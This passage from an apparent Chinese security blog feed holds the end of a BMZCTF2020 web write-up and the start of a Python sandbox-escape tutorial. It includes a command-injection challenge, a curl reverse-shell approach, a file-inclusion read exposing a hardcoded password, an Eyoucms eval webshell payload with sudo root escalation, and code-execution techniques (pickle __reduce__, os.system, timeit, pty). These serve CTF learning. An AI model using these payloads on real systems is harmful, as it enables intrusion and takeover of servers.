id="0x03-penetration">0x03 penetration</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">    $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    $_=<span class="keyword">array</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\:&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\@&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\)&#x27;</span>,<span class="string">&#x27;\!&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&#125;&#x27;</span>,<span class="string">&#x27;\&#123;&#x27;</span>,<span class="string">&#x27;\_&#x27;</span>);</span><br><span class="line">    $blacklist = array_merge($_);</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($ip) &lt;= <span class="number">18</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $ip)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            exec($ip);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤之后还剩下这些字符可以使用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># $ , &#x2F; ; ? \ &#96; | a c h l r s t u v y z 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>由于exec没有回显，应该要使用反弹shell，但是有字数长度限制，这里需要用curl命令读取远程文件绕过一下，而且要把ip地址转换成十进制表示，不知道是我的阿里云站点配置有问题还是怎么回事，我用curl命令+ip地址返回200，但是curl+十进制ip地址就直接给我返回301了，但是我看了宝塔的配置，也没有启用301重定向。</p><p>有知道原因的时候师傅可以告知我一下。</p><h2 id="0x04-BMZ-Market">0x04 BMZ_Market</h2><p>综合渗透类型，有点像HackTheBox。</p><p>首先进行信息搜集，查看源代码：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131109.png" alt=""></p><p>robots.txt</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131154.png" alt=""></p><p>一共搜集到两个地方，参数lang和robots.txt</p><p>参数lang存在文件包含漏洞，使用伪协议可以读取源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password =<span class="string">&quot;Nevergiveup135.&quot;</span> ;<span class="comment">//I have to remember it</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;lang&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;BMZ Market&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;author&quot;</span> content=<span class="string">&quot;bmz&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;BMZ Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &lt;link href=<span class="string">&quot;covers.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;BMZ Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;lang&#x27;</span>]))</span><br><span class="line">          &#123;</span><br><span class="line">          <span class="keyword">echo</span> $message;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">            Believe in yourself, you can find the flag</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Power by&lt;a href=<span class="string">&quot;#&quot;</span>&gt;@kuaile&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>有一个密码硬编码的地方：<code>Nevergiveup135.</code>，用户名可能是kuaile</p><p>robots.txt拿去base64 decode：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131506.png" alt=""></p><p>发现是颜文字，可以直接拿到浏览器的console界面执行</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131609.png" alt=""></p><p>又给了一个信息：<code>Challenger, the background of the website is -.../--/--../.-/-../--/../-.</code></p><p>后面是一个摩斯编码，解码后的结果是:<code>BMZADMIN</code>，看样子应该是一个后台管理界面，用上面得到的用户名和密码登录进入后台。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103131827.png" alt=""></p><p>可以看到当前的CMS版本是1.3.7，Google已知的利用方式：<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Eyoucms/Eyoucms%201.3.9%20%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web安全/Eyoucms/Eyoucms 1.3.9 上传漏洞/</a></p><p>这种利用方式好像打不通，参考mochu师傅的wp</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154407.png" alt=""></p><p>抓包修改参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;scene&#x3D;bbb\&#39;,$&#123;eval($_POST[mochu7])&#125;,&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103154643.png" alt=""></p><p>蚁剑连接，sudo -l发现可以无限制执行root命令：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155216.png" alt=""></p><p>再回头来看看后台上传文件RCE失效的原因：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103155327.png" alt=""></p><p>可能是作者把解压的类文件给删掉了。</p><p>来大概跟一下这个漏洞，文件位置在application/admin/controllor/Weapp.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165020.png" alt=""></p><p>由于过滤不严，直接把payload写到config.php文件当中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103164941.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103165136.png" alt=""></p><p>然后在core/library/think/App.php中包含了config.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103170458.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BMZCTF2020-Web-WriteUp&quot;&gt;BMZCTF2020 Web WriteUp&lt;/h1&gt;
&lt;h2 id=&quot;0x01-easyeval&quot;&gt;0x01 easyeval&lt;/h2&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://ca0y1h.top/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2021-01-03T02:53:44.000Z</published>
    <updated>2021-01-03T02:54:29.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python沙箱逃逸">Python沙箱逃逸</h1><p>上一篇写到了关于python flask SSTI的总结文章，看了沙箱逃逸之后，发现这两者的方法和payload很相似，所以把python的沙箱逃逸和服务端模板注入放在一起总结。</p><h2 id="0x01-基础知识">0x01 基础知识</h2><p>沙箱：沙箱是一种按照安全策略限制程序行为的执行环境。</p><p>沙箱逃逸：就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。</p><p>先来给上一道例题源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line">banned = [<span class="string">&quot;import&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;kevin sucks&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;banned&quot;</span>, <span class="string">&quot;cry sum more&quot;</span>, <span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>)</span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># this means nobreak</span></span><br><span class="line">            exec(data)</span><br></pre></td></tr></table></figure><p>一般而言沙箱逃逸的题目考到的知识点无非下面5个：</p><ul><li>python的导包</li><li>python执行代码和命令</li><li>python文件读取</li><li>内置模块</li><li>对象创建于引用</li></ul><p>那么与之相对应的解题思路大致分为5步：</p><ol><li>测试能否导包</li><li>哪些系统包做了限制</li><li>内置函数是否可用</li><li>静态检测or动态检测</li><li>对象之间的引用关系索引</li></ol><h2 id="0x02-花式导包">0x02 花式导包</h2><p>如果我们想在沙箱中getshell的话，必不可少的是要引入Python中执行命令的包，例如os,sys,subprocess等。</p><p>有些沙箱使用比较初级的办法，通过正则对输入代码内容进行过滤，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>这个时候，我们突破这种封锁，首先要学习的是Python的各种导包方法。</p><h3 id="初阶">初阶</h3><p>一般比较常见的是以下几种方法：</p><ul><li>import xxx</li><li>from xxx import *</li><li>_<em>import</em>_(“xxx”)</li><li>importlib库</li><li>imp 库</li><li>reload(xxx)</li></ul><p>第一个和第二个比较熟悉，不用过多赘述，<code>__import__</code>作为一个函数，只能接受字符串参数，返回值可以直接用来操作，通常在动态加载的时候使用这个函数，python2和python3通用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161327.png" alt=""></p><p>importlib模块是对import和<code>__import__</code>的补充，它也可以通过传入字符串来引入一个模块，python2和python3使用方法一样：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161631.png" alt=""></p><p>imp库的使用方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102161942.png" alt=""></p><p>reload 的用法比较有意思，假如沙箱导入了os模块，但是删除了system方法,强行使用system执行命令会报错:<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162046.png" alt=""></p><p>而我又想用system方法执行命令的话，可以使用reload重新加载os模块，恢复对system方法的引用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162126.png" alt=""></p><h3 id="高阶">高阶</h3><p>导包说到本质上其实是python 读取指定包的py文件，并将其加载到解释器的过程。在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是<code>sys.path</code>下的所有路径。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162508.png" alt=""></p><p>我使用的是Anaconda管理python版本，在一些常见的Linux发行版本上，路径一般都是在<code>/usr/lib/python3.X</code>目录下。</p><p>因此我们可以直接执行对应包的文件，从而实现包的导入。在py2中有execfile这个函数：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102162944.png" alt=""></p><p>在python3中没有execfile这个函数，但是又exec，可以通过读文件交给exec执行的方式导入包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163247.png" alt=""></p><p>上面说到导包的本质是python读取指定的文件，import的本质是：搜索modules并绑定到局部变量</p><p><code>import module_name</code>实质是将<code>module_name.py</code>中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是<code>module</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163713.png" alt=""></p><p>现在设置一下modules中<code>os</code>的值为None：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102163756.png" alt=""></p><p>发现把os从<code>modules</code>中删去就不能直接引入了。但是，我们可以接着设置<code>os</code>的模块的路径，从而引入该模块：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164329.png" alt=""></p><p>另外，我们将 sys.modules 中的os 删除即可，这样import 发现 sys.modules没有os这个模块，就会重新创建。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210102164528.png" alt=""></p><h2 id="0x03-执行代码和命令">0x03 执行代码和命令</h2><h3 id="动态执行代码">动态执行代码</h3><p>(1) eval/exec/execfile</p><p>在上文中，已经讲解了exec/execfile的用法。这里再总结一下：</p><ul><li>exec(source)：动态执行复杂的python代码，函数的返回值永远为None。</li><li>execfile(filename)：执行一个py文件的内容。</li></ul><p>eval用来执行简单的python表达式返回表达式的结果，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) pickle 序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span>    </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span>        </span><br><span class="line">    <span class="keyword">import</span> os        </span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">  admin = A()</span><br><span class="line">  B = pickle.dumps(admin)</span><br><span class="line">  print(pickle.dumps(admin))</span><br><span class="line"><span class="comment"># cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.</span></span><br></pre></td></tr></table></figure><p>保存序列化之后的字符串，然后通过pickle.loads加载即可完成代码的执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.loads(<span class="string">&quot;cnt\nsystem\np0\n(S&#x27;whoami&#x27;\np1\ntp2\nRp3\n.&quot;</span>)</span><br></pre></td></tr></table></figure><p>(3) timeit 这个模块是用来测试代码的执行时间的，可以动态执行代码，代码是字符串形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行命令">执行命令</h3><p>(1) os模块</p><p>可以通过os.system(cmd),os.popen(cmd)调用系统命令，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(2) commands 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">print(commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>(3) subprocess模块</p><p>subprocess模块是相对比较复杂的，有很多执行命令的函数：</p><ul><li>subprocess.run() Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</li><li>subprocess.call() 执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</li><li>subprocess.check_call() Python 2.5中新增的函数。执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</li><li>subprocess.check_output() Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</li><li>subprocess.getoutput(cmd) 接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</li><li>subprocess.getstatusoutput(cmd) 执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</li></ul><p>(4) platform 模块</p><p>可以调用platform 模块 中的 popen 这个函数执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">print(platform.popen(<span class="string">&#x27;ls&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize= <span class="number">-1</span>).read())</span><br><span class="line">platform.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(5) pty 模块</p><p>pty模块可以生成一个伪终端，可以简单理解为bash，因此是可以执行命令的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ptypty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>(6) cgi 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line">cgi.os.system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-文件读取">0x04 文件读取</h2><h3 id="初阶-v2">初阶</h3><p>(1)open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)file（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(__file__).read()</span><br></pre></td></tr></table></figure><h3 id="高阶-v2">高阶</h3><p>(1)codecs模块（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(__file__).read()</span><br></pre></td></tr></table></figure><p>(2)types模块（python2）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line">types.FileType(__file__,<span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>(3)os.open（python2，python3）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fd = os.open(__file__, os.O_RDONLY)</span><br><span class="line">print(os.read(fd, <span class="number">1024</span>))</span><br></pre></td></tr></table></figure><p>(4)file协议</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">u = 